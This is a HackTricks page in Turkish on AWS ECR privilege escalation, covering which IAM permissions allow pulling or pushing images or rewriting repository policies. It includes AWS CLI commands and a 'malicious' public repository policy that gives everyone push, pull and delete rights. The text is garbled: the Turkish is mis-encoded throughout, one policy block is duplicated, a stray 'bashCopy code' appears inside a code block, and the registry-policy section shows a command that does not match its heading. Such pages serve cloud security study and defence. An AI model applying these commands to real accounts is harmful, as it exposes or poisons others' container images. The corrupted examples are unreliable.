# AWS - ECR Privilege Escalation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

**`ecr:GetAuthorizationToken`** ve **`ecr:BatchGetImage`** izinlerine sahip bir saldÄ±rgan, ECR'ye giriÅŸ yapabilir ve gÃ¶rÃ¼ntÃ¼leri indirebilir.

GÃ¶rÃ¼ntÃ¼leri nasÄ±l indireceÄŸiniz hakkÄ±nda daha fazla bilgi iÃ§in:

{% content-ref url="../aws-post-exploitation/aws-ecr-post-exploitation.md" %}
[aws-ecr-post-exploitation.md](../aws-post-exploitation/aws-ecr-post-exploitation.md)
{% endcontent-ref %}

**Potansiyel Etki:** Trafikteki hassas bilgileri ele geÃ§irerek dolaylÄ± olarak ayrÄ±calÄ±k yÃ¼kseltme.

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

Bu izinlere sahip bir saldÄ±rgan, ECR'ye giriÅŸ yapabilir ve gÃ¶rÃ¼ntÃ¼leri yÃ¼kleyebilir. Bu, bu gÃ¶rÃ¼ntÃ¼lerin kullanÄ±ldÄ±ÄŸÄ± diÄŸer ortamlarda ayrÄ±calÄ±klarÄ± yÃ¼kseltmek iÃ§in kullanÄ±ÅŸlÄ± olabilir.

Yeni bir gÃ¶rÃ¼ntÃ¼ yÃ¼klemeyi/gÃ¼ncellemeyi nasÄ±l yapacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in kontrol edin:

{% content-ref url="../aws-services/aws-eks-enum.md" %}
[aws-eks-enum.md](../aws-services/aws-eks-enum.md)
{% endcontent-ref %}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Ã–nceki bÃ¶lÃ¼mle aynÄ±, ancak halka aÃ§Ä±k depolar iÃ§in geÃ§erlidir.

### `ecr:SetRepositoryPolicy`

Bu izne sahip bir saldÄ±rgan, **depo politikasÄ±nÄ± deÄŸiÅŸtirebilir** ve kendisine (veya herkese) **okuma/yazma eriÅŸimi** saÄŸlayabilir.\
Ã–rneÄŸin, bu Ã¶rnekte herkese okuma eriÅŸimi verilmiÅŸtir.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
`my-policy.json` dosyasÄ±nÄ±n iÃ§eriÄŸi:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "ecr:GetAuthorizationToken",
        "ecr:BatchCheckLayerAvailability",
        "ecr:GetDownloadUrlForLayer",
        "ecr:GetRepositoryPolicy",
        "ecr:DescribeRepositories",
        "ecr:ListImages",
        "ecr:DescribeImages",
        "ecr:BatchGetImage",
        "ecr:GetLifecyclePolicy",
        "ecr:GetLifecyclePolicyPreview",
        "ecr:ListTagsForResource",
        "ecr:DescribeImageScanFindings",
        "ecr:InitiateLayerUpload",
        "ecr:UploadLayerPart",
        "ecr:CompleteLayerUpload",
        "ecr:PutImage"
      ],
      "Resource": "*"
    }
  ]
}
```

`my-policy.json` dosyasÄ±nÄ±n iÃ§eriÄŸi:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "ecr:GetAuthorizationToken",
        "ecr:BatchCheckLayerAvailability",
        "ecr:GetDownloadUrlForLayer",
        "ecr:GetRepositoryPolicy",
        "ecr:DescribeRepositories",
        "ecr:ListImages",
        "ecr:DescribeImages",
        "ecr:BatchGetImage",
        "ecr:GetLifecyclePolicy",
        "ecr:GetLifecyclePolicyPreview",
        "ecr:ListTagsForResource",
        "ecr:DescribeImageScanFindings",
        "ecr:InitiateLayerUpload",
        "ecr:UploadLayerPart",
        "ecr:CompleteLayerUpload",
        "ecr:PutImage"
      ],
      "Resource": "*"
    }
  ]
}
```
```json
{
"Version" : "2008-10-17",
"Statement" : [
{
"Sid" : "allow public pull",
"Effect" : "Allow",
"Principal" : "*",
"Action" : [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

Ã–nceki bÃ¶lÃ¼m gibi, ancak halka aÃ§Ä±k depolar iÃ§in geÃ§erlidir.\
Bir saldÄ±rgan, ECR Public deposunun politikasÄ±nÄ± deÄŸiÅŸtirerek yetkisiz halka aÃ§Ä±k eriÅŸim saÄŸlayabilir veya ayrÄ±calÄ±klarÄ±nÄ± yÃ¼kseltebilir.

{% code overflow="wrap" %}
```bash
bashCopy code# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
{% endcode %}

**Potansiyel Etki**: Yetkisiz halka aÃ§Ä±k ECR Genel deposuna eriÅŸim, herhangi bir kullanÄ±cÄ±nÄ±n gÃ¶rÃ¼ntÃ¼leri itme, Ã§ekme veya silme yetkisine sahip olmasÄ±na olanak tanÄ±r.

### `ecr:PutRegistryPolicy`

Bu izne sahip bir saldÄ±rgan, **kayÄ±t defteri politikasÄ±nÄ± deÄŸiÅŸtirebilir** ve kendisine, hesabÄ±na (veya hatta herkese) **okuma/yazma eriÅŸimi** saÄŸlayabilir.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
